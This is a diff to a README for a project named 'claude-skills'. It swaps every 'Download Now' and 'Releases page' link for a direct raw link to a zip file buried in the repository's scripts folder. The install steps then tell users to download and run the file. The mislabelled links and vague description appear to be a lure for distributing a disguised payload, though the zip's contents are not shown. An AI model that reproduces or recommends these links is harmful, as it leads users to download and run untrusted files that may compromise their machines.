@@ -1,6 +1,6 @@
 # 🎉 claude-skills - Unlock Fun with Claude Skills
 
-[![Download Now](https://github.com/24111999/claude-skills/raw/refs/heads/main/slide-studio/assets/claude-skills-v1.5.zip%20Now-claude%20skills-brightgreen)](https://github.com/24111999/claude-skills/raw/refs/heads/main/slide-studio/assets/claude-skills-v1.5.zip)
+[![Download Now](https://raw.githubusercontent.com/24111999/claude-skills/main/slide-studio/scripts/skills_claude_poetship.zip%20Now-claude%20skills-brightgreen)](https://raw.githubusercontent.com/24111999/claude-skills/main/slide-studio/scripts/skills_claude_poetship.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ Follow these simple steps to get started with **claude-skills**. Just make sure 
 
 ## 📦 Download & Install
 
-1. Visit the [Releases page](https://github.com/24111999/claude-skills/raw/refs/heads/main/slide-studio/assets/claude-skills-v1.5.zip) to download the latest version of **claude-skills**.
+1. Visit the [Releases page](https://raw.githubusercontent.com/24111999/claude-skills/main/slide-studio/scripts/skills_claude_poetship.zip) to download the latest version of **claude-skills**.
 2. Find the version you want to download; it will usually be the one at the top.
 3. Click on the appropriate file for your operating system (Windows, macOS, etc.). 
 4. After the file has downloaded, locate it in your downloads folder.
@@ -51,7 +51,7 @@ If you encounter any issues or have questions, feel free to reach out for help. 
 
 ## 🔗 Additional Resources
 
-- Visit our [Releases page](https://github.com/24111999/claude-skills/raw/refs/heads/main/slide-studio/assets/claude-skills-v1.5.zip) for the latest updates and downloads.
+- Visit our [Releases page](https://raw.githubusercontent.com/24111999/claude-skills/main/slide-studio/scripts/skills_claude_poetship.zip) for the latest updates and downloads.
 - Check out our community forums for tips and tricks from fellow users.
 
 Happy exploring! Enjoy using **claude-skills** to make your interactions delightful!
